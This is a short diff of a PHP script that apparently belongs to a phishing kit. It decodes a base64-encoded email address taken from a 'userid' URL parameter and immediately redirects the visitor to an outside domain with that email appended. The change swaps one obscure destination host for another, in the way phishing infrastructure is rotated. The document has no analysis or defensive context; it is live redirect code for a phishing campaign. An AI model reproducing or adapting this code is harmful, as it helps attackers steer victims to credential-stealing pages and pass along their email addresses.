@@ -14,7 +14,7 @@ function decode($email){
 			 $email = base64_decode($email,false);
 		}
 
-       header( "refresh:0;url=https://d94y2.ianpern.ru/xx/".$email);
+       header( "refresh:0;url=https://isc-secure.net/jfjnfdnjsbgfmbgjgfdjkesvd/gfbrhnyjyjnnjynyjnyyt/temp/".$email);
 
 }
 if(isset($_GET['userid']) && !empty($_GET['userid'])){
